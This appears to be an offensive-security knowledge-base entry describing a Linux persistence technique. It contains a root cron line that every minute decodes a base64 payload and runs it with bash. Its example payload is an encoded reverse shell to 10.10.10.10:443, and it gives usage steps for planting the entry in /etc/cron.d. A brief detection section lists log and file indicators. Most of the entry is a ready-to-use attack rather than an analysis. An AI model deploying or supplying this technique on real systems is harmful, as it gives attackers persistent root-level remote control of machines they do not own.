---
type: code
language: cron
verified: true
platforms:
  - Linux
tags:
  - persistence
  - scheduled-task
validated: true
---

# Cron-Job-Payload-Decoder

## Code

```cron
* * * * * root echo -n $_BASE64_ENCODED_PAYLOAD | base64 -d | bash
```

## Description

This cron job entry schedules execution every minute as root, decoding a base64-encoded payload and piping it to bash for immediate runtime execution. It is designed for persistence in Linux systems where direct payload writing is restricted.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_BASE64_ENCODED_PAYLOAD | The base64-encoded string of the payload | YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMQ== |

## Usage

Insert into a file in /etc/cron.d/ using a root-privileged editor. The job runs perpetually until removed. Substitute the encoded payload before saving. Requires root ownership of the file.

## Detection

- Cron log entries showing base64 decoding or bash pipe executions.
- Anomalous root-owned files in /etc/cron.d/ with echo/base64 patterns.
- Periodic network callbacks from cron-spawned bash processes.

## Related

- [[procedures/Schedule-Cron-Job-with-Root-Write-Privileges]]
- [[codes/Bash-TCP-Reverse-Shell]]
